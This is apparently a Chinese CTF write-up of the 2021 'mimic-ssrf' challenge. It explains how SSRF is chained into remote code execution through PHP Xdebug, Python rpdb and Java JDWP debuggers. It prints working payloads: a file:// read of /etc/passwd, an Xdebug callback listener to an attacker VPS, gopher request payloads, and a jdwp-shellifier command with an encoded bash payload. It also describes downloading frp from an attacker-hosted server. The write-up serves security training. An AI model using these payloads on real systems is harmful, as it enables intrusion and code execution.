# 【拟态挑战WP】2021年春秋杯秋季赛mimic-ssrf

> 原文: https://www.ctfiot.com/22547.html
> ID: 22547

楔子

本次比赛中，春秋GAME和紫金山实验室合作，借鉴邬江兴院士拟态防御理论设计了mimic-ssrf题目，该题目是个通过ssrf进行RCE的web环境，三种开发语言的debug调试器，代表了三种单异构体。一般黑客的攻击指令只会由一个异构体进行执行反馈，明确的攻击指令会有明确的反馈结果，但是在这道题中选手的攻击指令必须同时让3个异构体反馈一致的结果，不然在拟态的防御机制中，就会被表决失效。

在了解拟态防御理论的同时，对于该技术的应用你有什么问题或建议，欢迎给我们留言。如果有特别有趣的想法或建设性意见，我们会有礼品赠送。

分析

首先解读下题目名，mimic指的是“拟态”，ssrf指的是“由攻击者构造形成由服务端发起请求的安全漏洞”。再由题目描述可知，应该是要通过ssrf暴露远程debug端口，利用三种编程语言的debug调试器进行攻击。

该题以ssrf为入口：

尝试使用file协议读文件ssrf?url=file:///etc/passwd

可以看到成功读到/etc/passwd。

这个时候我们就可以考虑通过对linux下面的proc目录遍历进程，收集有用的信息。

/ssrf?url=file:///proc/§1§/cmdline可以得到大概有四个服务，如下：

根据题目描述可知，本题内网使用了3种语言所搭建的服务，分别php、python和java，接下来就按顺序来分析和利用。

php Xdebug RCE

XDebug是PHP的一个扩展，用于调试PHP代码。

我们访问带有XDEBUG_SESSION_START参数时，目标服务器的XDebug将会连接访问者的IP（或X-Forwarded-For头指定的地址）将debug信息转发到相关客户端的调试端口并且可以执行相关调试函数，即可在目标服务器上执行任意PHP代码。

先读取index.php文件看看有什么信息。

php的http服务里面什么都没有，读取php.ini

可以发现开启了xdebug和相关配置，client_port是13000。

我们可以现在远程vps执行如下

#!/usr/bin/python2
import socket

ip_port = ('0.0.0.0',13000)
sk = socket.socket()
sk.bind(ip_port)
sk.listen(10)
conn, addr = sk.accept()

while True:
    client_data = conn.recv(1024)
    print(client_data)

    data = raw_input('>> ')
    conn.sendall('eval -i 1 -- %sx00' % data.encode('base64'))

通过gopher构造get请求的原始数据

gopher://127.0.0.1:
7410/_GET%2520%252Findex.php%253FXDEBUG_SESSION_START%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%253A7410%250D%250AUser-Agent%253A%2520curl%252F7.58.0%250D%250AAccept%253A%2520*%252F*%250D%250AX-Forwarded-For%253A%2520ip%250D%250A%250D%250A

vps接着收到了信息；然后可以system("ls / |base64 -w 0")执行任意代码了。

python rpdb RCE

rpdb扩展了pdb，让pdb支持远程调试功能。

使用rpdb的python脚本在远程启动，本地通过telnet方式连接上rpdb提供的调试端口（默认端口4444），可以直接执行python代码。

先读/web/python/app.py

发现使用了远程调试器rpdb。

我们可以直接通过gopher攻击python把flag写入到/tmp/，然后直接通过file协议读取文件。

gopher://127.0.0.1:
4444/_open("/tmp/python_flag","w").write(fl1l1l1l1laaggg)

java JDWP RCE

Java 虚拟机为 Java 语言提供 Java debugger、JDB 调试功能，应用在编译过程中可以开启 Remote Debug 模式，方便程序员远程对代码进行调试。但是，该模式没有身份校验机制，且可执行系统命令

同样先查看源码/web/java/Hello_web.jar

可以发现是触发了String.equals这个函数。

需要做socket代理(直接用frp就行)

远程搭建一个http服务，让容器下载我们的frp的工具，通过php的shell下载文件，搭建socket的通道

然后就是攻击java的debug(jdwp-shellifier.py(https://github.com/IOActive/jdwp-shellifier))，打了之后是卡住的，通过ssrf的接口服务java的web服务即可触发断点

proxychains python jdwp-shellifier.py -t 127.0.0.1 -p 20211 --cmd 'bash -c {echo,Y2F0IC9qYXZhX2ZsYWc+IC90bXAvamF2YV9mbGFn}|{base64,-d}|{bash,-i}' --break-on 'java.lang.String.equals'(proxychains 配置的是自己的socket配置)

最后通过file协议读取java的flag。

GAME福利

为了让更多选手可以回味本次比赛的精彩过程，持续学习和训练，并且可以学习邬江兴院士拟态防御理论，实际体验拟态防御机制的特点，春秋GAME团队将mimic-ssrf题目部署到“伽玛实验场之拟态挑战”，欢迎各位师傅交流讨论。https://www.ichunqiu.com/competition

也欢迎大家到我们和紫金山实验室合作的NEST内生安全实验场中体验真实的拟态设备挑战，为各位大佬们的日常研究和安全工作提供更多经验和借鉴。

https://nest.ichunqiu.com/

相关阅读

【拟态挑战WP】2021年天津市大学生线上初赛mimic-ssti

Writeup | 巅峰极客线上初赛mimic-game


```
#!/usr/bin/python2
import socket

ip_port = ('0.0.0.0',13000)
sk = socket.socket()
sk.bind(ip_port)
sk.listen(10)
conn, addr = sk.accept()

while True:
    client_data = conn.recv(1024)
    print(client_data)

    data = raw_input('>> ')
    conn.sendall('eval -i 1 -- %sx00' % data.encode('base64'))
gopher://127.0.0.1:
7410/_GET%2520%252Findex.php%253FXDEBUG_SESSION_START%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%253A7410%250D%250AUser-Agent%253A%2520curl%252F7.58.0%250D%250AAccept%253A%2520*%252F*%250D%250AX-Forwarded-For%253A%2520ip%250D%250A%250D%250A
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/01/1-1642034512.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/01/2-1642034512.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/01/0-1642034513.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/01/10-1642034513.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/01/0-1642034514.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/01/3-1642034514.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/01/9-1642034515.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/01/7-1642034515.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/01/10-1642034516.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/01/8-1642034516.png)